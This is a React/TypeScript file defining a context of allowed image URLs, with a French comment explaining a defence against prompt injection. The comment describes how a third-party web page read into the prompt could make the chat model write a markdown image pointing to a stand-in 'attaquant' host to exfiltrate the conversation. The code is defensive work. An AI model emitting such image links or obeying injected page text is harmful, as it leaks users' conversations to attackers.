import { createContext } from 'react'

/**
 * URLs d'images que `RichMessage` a le droit de CHARGER, pour le message en
 * cours de rendu — ou `undefined` : aucune restriction.
 *
 * Posée par le chat sur un tour qui a lu une URL (trame `images_autorisees`
 * de modules/chat/router.py, persistée sur la réponse) : c'est l'ensemble de
 * référence des citations de ce tour. Une page lue est un texte écrit par un
 * tiers, qui entre dans le prompt ; « écris `![](https://attaquant/?q=…)` »
 * y suffirait à exfiltrer la conversation, puisqu'une `<img>` se charge
 * sans clic dès que la syntaxe est complète dans le flux. La CSP `img-src`
 * ne protège pas : elle est en observation (core/csp.py).
 *
 * Un contexte plutôt qu'une prop : le texte du modèle est rendu à trois
 * endroits d'un même message (bulle, étapes du pipeline, colonnes de
 * comparaison) — un seul `Provider` autour du message les couvre tous, sans
 * qu'un futur point de rendu puisse l'oublier.
 *
 * Fichier à part de `RichMessage.tsx` : un fichier de composant qui exporte
 * aussi autre chose qu'un composant casse le rafraîchissement à chaud
 * (règle eslint `react-refresh/only-export-components`).
 */
export const ImagesAutoriseesContext = createContext<readonly string[] | undefined>(undefined)
